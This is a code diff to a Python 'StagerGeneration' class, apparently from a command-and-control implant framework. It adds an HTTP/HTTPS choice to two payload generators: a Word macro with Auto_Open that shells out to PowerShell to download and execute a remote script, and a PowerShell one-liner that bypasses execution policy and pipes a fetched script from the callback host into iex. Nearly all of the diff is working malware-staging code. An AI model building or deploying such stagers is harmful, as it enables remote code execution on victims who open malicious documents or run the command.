@@ -32,18 +32,32 @@ class StagerGeneration():
 
 
     def __generate_docx_stager_string(self, implant_data):
+        if implant_data['comms_https'] == 1:
+            http_proto = "https"
+        else:
+            http_proto = "http"
         stager_string = '''Sub Auto_Open()
 Dim exec As String
-exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('{}:{}/robots.txt?user={}'))"""
+exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('{}://{}:{}/robots.txt?user={}'))"""
 Shell (exec)
 End Sub
-:return:'''.format(implant_data['callback_url'], str(implant_data['port']), implant_data['stager_key'])
+:return:'''.format(http_proto,implant_data['callback_url'], str(implant_data['port']), implant_data['stager_key'])
 
         return stager_string
 
 
     def __generate_powershell_stager_string(self, implant_data):
+        if implant_data['comms_https'] == 1:
+            http_proto = "https"
+        else:
+            http_proto = "http"
         stager_string = "powershell -exec bypass - c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://" + \
                         implant_data['callback_url'] + ":" + str(implant_data['port']) + "/robots.txt?user=" + implant_data[
                             'stager_key'] + "')|iex"
+        stager_string = "powershell -exec bypass - c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{}://{}:{}/robots.txt?user={}')|iex".format(
+            http_proto,
+            implant_data['callback_url'],
+            implant_data['port'],
+            implant_data['stager_key'])
+
         return stager_string
